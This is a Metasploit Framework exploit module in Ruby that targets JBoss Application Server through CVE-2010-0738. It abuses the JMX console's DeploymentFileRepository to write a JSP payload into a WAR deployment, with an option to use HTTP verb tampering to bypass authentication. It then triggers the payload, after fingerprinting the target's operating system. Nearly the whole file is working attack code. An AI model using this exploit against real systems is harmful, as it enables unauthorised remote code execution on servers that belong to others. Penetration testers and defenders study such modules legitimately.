##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
	super(update_info(info,
		'Name'        => 'JBoss Java Class DeploymentFileRepository WAR deployment',
		'Description' => %q{
				This module uses the DeploymentFileRepository class in 
				JBoss Application Server (jbossas) to deploy a JSP file 
				in a minimal WAR context.
		},
		'Author'      => [ 'MC', 'Jacob Giannantonio', 'Patrick Hof' ],
		'License'     => MSF_LICENSE,
		'References'  =>
		[
			[ 'CVE', '2010-0738' ], # by using VERB other than GET/POST
			[ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ]
		],
		'Privileged'  => false,
		'Platform'    => ['linux', 'windows' ],
		'Targets'     =>
		[
			[ 'Universal',
				{
					'Arch' => ARCH_JAVA,
					'Payload' =>
						{
							'DisableNops' => true,
						},
				}
			],
		],
		'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('SHELL', [ true, "The system shell to use.", 'automatic']),
				OptString.new('PATH',  [ true, "Deployment path", rand_text_alphanumeric(8+rand(8))]),
				OptString.new('JSP',   [ true, "JSP filename (without .jsp extension)", rand_text_alphanumeric(8+rand(8))]),
				OptString.new('VERB',  [ true, "The HTTP verb to use", "POST"]),
			], self.class)
	end

	def exploit
		if datastore['SHELL'] == 'automatic'
			if not (plat = detect_platform())
				raise RuntimeError, 'Unable to detect platform!'
			end

			case plat
			when 'linux'
				datastore['SHELL'] = '/bin/sh'
			when 'win'
				datastore['SHELL'] = 'cmd.exe'
			end

			print_status("SHELL set to #{datastore['SHELL']}")

			return if ((p = regenerate_payload(cli)) == nil)
		end

		data =  'action=invokeOpByName'
		data << '&name=jboss.admin%3Aservice%3DDeploymentFileRepository'
		data << '&methodName=store'
		data << '&argType=java.lang.String'
		data << '&arg0=' + Rex::Text.uri_encode(datastore['PATH']) + '.war'
		data << '&argType=java.lang.String'
		data << '&arg1=' + datastore['JSP']
		data << '&argType=java.lang.String'
		data << '&arg2=.jsp'
		data << '&argType=java.lang.String'
		data << '&arg3=' + Rex::Text.uri_encode(payload.encoded)
		data << '&argType=boolean'
		data << '&arg4=True'

		if (datastore['VERB'] == "POST")
			res = send_request_cgi(
				{
					'uri'    => '/jmx-console/HtmlAdaptor',
					'method' => datastore['VERB'],
					'data'   => data
				}, 5)
		else
			res = send_request_cgi(
				{
					'uri'    =>  '/jmx-console/HtmlAdaptor;index.jsp?' + data,
					'method' => datastore['VERB'],
				}, 5)
		end

		# Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),
		# but the file still gets written.
		if (res.code == 200 || res.code == 500)
			uri = '/' + datastore['PATH'] + '/' + datastore['JSP'] + '.jsp'
			print_status("Triggering payload at '#{uri}'...")
			verb = 'GET'
			if (datastore['VERB'] != 'GET' and datastore['VERB'] != 'POST')
				verb = 'HEAD'
			end
		# JBoss might need some time for the deployment. Try 5 times at most
		# and sleep 3 seconds in between.
		5.times do
			res = send_request_raw(
				{
					'uri'    => uri,
					'method' => verb,
				})
			if !res
				print_error("Execution failed on '#{uri}' [No Response], retrying...")
				select(nil,nil,nil,3)
			elsif (res.code < 200 or res.code >= 300)
				print_error("Execution failed on '#{uri}' [#{res.code} #{res.message}], retrying...")
				select(nil,nil,nil,3)				
			elsif res.code == 200
				print_status("Successfully triggered payload at '#{uri}'.")
				break
				end
			end
		else
			print_error("Denied...")
		end
		handler
	end

	def detect_platform
		print_status("Attempting to automatically detect the platform...")
		path = '/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo'
		res = send_request_raw(
			{
				'uri' => path,
			}, 20)

		if (not res) or (res.code != 200)
			print_error("Failed: Error requesting #{path}")
			return nil
		end

		if (res.body =~ /<td.*?OSName.*?(Linux|Windows).*?<\/td>/m)
			os = $1
			if (os =~ /Linux/i)
				return 'linux'
			elsif (os =~ /Windows/i)
				return 'win'
			end
		end
		nil
	end
end
